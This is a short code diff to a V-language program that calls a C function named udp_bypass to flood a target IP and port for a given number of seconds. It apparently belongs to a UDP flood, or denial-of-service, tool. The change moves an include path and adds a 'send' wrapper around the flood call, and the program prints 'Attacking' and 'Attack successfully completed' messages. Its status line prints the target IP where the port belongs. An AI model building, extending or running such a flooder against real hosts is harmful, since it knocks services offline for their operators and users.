@@ -1,6 +1,6 @@
 import os
 import time
-#include "@VROOT/methods/udp.c"
+#include "@VROOT/core/methods/udp.c"
 
 fn C.udp_bypass(string, u16, int)
 
@@ -13,7 +13,11 @@ fn main() {
 
 	println("[+] Attacking ${args[1]}:${args[1]} for ${args[3]} seconds....!")
 
-	udp_bypass(args[1], args[2].u16(), args[3].int())
+	send(args[1], args[2].u16(), args[3].int())
 
 	println("[ + ] Attack successfully completed.....!")
+}
+
+fn send(ip string, p u16, t int) {
+	C.udp_bypass(c'$ip', p, t)
 }
